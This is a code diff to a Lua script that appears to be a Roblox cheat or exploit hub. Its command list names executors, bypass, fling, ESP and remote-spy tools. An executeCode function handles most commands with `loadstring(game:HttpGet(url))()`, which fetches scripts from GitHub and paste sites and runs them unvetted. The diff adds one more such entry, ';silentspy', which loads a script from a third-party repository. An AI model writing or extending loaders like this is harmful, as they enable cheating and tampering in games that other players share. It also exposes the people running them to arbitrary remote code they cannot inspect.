@@ -7,7 +7,7 @@ return function(scriptBox, player)
         ";prox", ";rochips", ";fc1", ";fc2", ";synapse", ";synapse2", ";krnl", ";krnlk", ";bypass", ";fc3", ";rp", ";rp2", ";srp", ";srp2", ";tictactoe", ";illus", ";toolgui", ";keyb", ";cspy", ";slock", ";wibtt", ";acl", ";crouch", ";srp3", ";srp4", ";tptool", ";ngp", ";fling", ";esp", ";radar", ";OCDtool", ";fc4", ";guneditor",
         ";rc7", ";cunc", ";keyb2", ";na3", ";backpack", ";backpack2", ";r15anims", ";knpc2",
         ";krnlk (key: 9X1L9ZPAXN4)",
-        ";hydroxide", ";rspy", ";sspyV3", ";dex++", ";dex", ";darkdex", ";sspy", ";sspym", ";sigma (rip)", ";cobalt", ";sspym2",
+        ";hydroxide", ";rspy", ";sspyV3", ";dex++", ";dex", ";darkdex", ";sspy", ";sspym", ";sigma (rip)", ";cobalt", ";sspym2", ";silentspy",
     }
 
     local function executeCode(code)
@@ -63,6 +63,8 @@ return function(scriptBox, player)
             loadstring(game:HttpGet("https://github.com/exxtremestuffs/SimpleSpySource/raw/master/SimpleSpy.lua"))()
         elseif code == ";hydroxide" then
             loadstring(game:HttpGet("https://paste.myconan.net/617098.txt "))()
+        elseif code == ";silentspy" then
+            loadstring(game:HttpGet("https://raw.githubusercontent.com/FryzerHub/Biggestscript/refs/heads/main/SilentSpy"))()
         elseif code == ";knpc2" then
             loadstring(game:HttpGet("https://paste.myconan.net/611639.txt "))()
         elseif code == ";OCDtool" then
